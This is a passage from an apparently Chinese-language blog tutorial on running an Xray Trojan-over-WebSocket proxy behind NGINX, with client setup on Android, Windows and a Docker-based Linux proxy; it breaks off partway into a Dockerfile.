class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>使用如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray -<span class="hljs-built_in">test</span> -config /usr/local/etc/xray/config.json</span><br></code></pre></td></tr></table></figure><p>显示如下结果说明配置文件正常：</p><p><img src="https://s2.loli.net/2024/09/12/EYHDBwvkuoXnOtN.png"></p><p>然后重启 xray：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart xray</span><br></code></pre></td></tr></table></figure><h2 id="配置-NGINX-转发-Xray"><a href="#配置-NGINX-转发-Xray" class="headerlink" title="配置 NGINX 转发 Xray"></a>配置 NGINX 转发 Xray</h2><p>目前有两种主流方案：Xray 前置与 NGINX 前置，前置意味着该节点负责接收所有流量，并分流到相应的服务上，Xray 前置则意味着由 Xray 检测协议，并将非 <code>VLESS/Trojan/...</code> 协议“回落”到 NGINX，NGINX 前置则反过来</p><p>Xray 回落 NGINX 据说已经有能够检测的手段，因此这里我们配置 NGINX 反代 WebSocket 流量转发到后端的代理服务器</p><p>将 NGINX 配置文件中的 443 端口监听修改如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /和xray配置相同的你的自定义路径 &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                &#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:和xray配置相同的你的自定义本地监听端口，例如11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://你自己的域名/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后按惯例重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>至此，服务端侧的配置全部完成</p><h1 id="0x03-连接代理服务器"><a href="#0x03-连接代理服务器" class="headerlink" title="0x03. 连接代理服务器"></a>0x03. 连接代理服务器</h1><h2 id="在-Android-手机上进行连接"><a href="#在-Android-手机上进行连接" class="headerlink" title="在 Android 手机上进行连接"></a>在 Android 手机上进行连接</h2><p>既然最初的目的是玩原神，那么首先肯定要先看看在手机上如何配置</p><p>对于 Android 系统，可以在 Google Play 商店下载 v2rayNG，手动输入 trojan 相关配置即可，注意地址和 host 仅写域名，不要把 <code>https://</code> 和子路径也给写进去了：</p><p><img src="https://s2.loli.net/2024/09/19/5KhrJYWVHeQqPmc.jpg"></p><p>测试，成功迁移到笔者在 Vultr 购买的位于 Singapore 的服务器：</p><p><img src="https://s2.loli.net/2024/09/19/SvTfzqpi2e5RsjK.jpg"></p><h2 id="在-Windows-上进行连接"><a href="#在-Windows-上进行连接" class="headerlink" title="在 Windows 上进行连接"></a>在 Windows 上进行连接</h2><p>大部分人物理机用的应该还是 Windows，但是笔者不用 Windows，所以这里笔者仅给一个 Windows 下大概能用的方案： ）</p><p>使用 <a href="https://github.com/2dust/v2rayN">v2rayN</a> 按照下面的方式配置就行，注意地址仅写域名，不要把 <code>https://</code> 和子路径也给写进去了，否则会报 <code>too many colon in address</code> 的错误，端口默认写 443，传输方式里的路径带上 <code>/</code> ：</p><p><img src="https://s2.loli.net/2024/09/18/8bGpnTSxU716L9v.png"></p><p>然后在系统设置里配置一下手动代理即可：</p><p><img src="https://s2.loli.net/2024/09/18/jCRKBgI9yecsL8b.png"></p><p>测试，成功迁移到笔者在 Vultr 购买的位于 Singapore 的服务器：</p><p><img src="https://s2.loli.net/2024/09/18/kaslX7NpQe3BLRE.png"></p><h2 id="在-Linux-上进行连接"><a href="#在-Linux-上进行连接" class="headerlink" title="在 Linux 上进行连接"></a>在 Linux 上进行连接</h2><h3 id="方法一：使用-Docker-配置本地代理"><a href="#方法一：使用-Docker-配置本地代理" class="headerlink" title="方法一：使用 Docker 配置本地代理"></a>方法一：使用 Docker 配置本地代理</h3><p>docker 相对而言比较安全（ <del>如果真有人抽象到在上游供应链里放一个 kernel 通杀 0day 来劫持👴的电脑当肉鸡那👴也认了</del> ），而且也没有对不同发行版环境的要求，因此笔者首推使用 docker 配置本地的代理，我们只需要把 http 请求转发到 Docker 容器中的 xray 代理就行</p><p>我们首先按惯例编写一份 <code>config.json</code> ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11450</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>因为镜像其实不难写所以我们直接自己写一个 Dockerfile ，不过官方安装脚本仅适用于 systemd（ <del>虽然笔者不使用 OpenRC 但是还是震怒了</del> ），但是直接把 xray 的二进制可执行文件拉下来运行其实也行：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 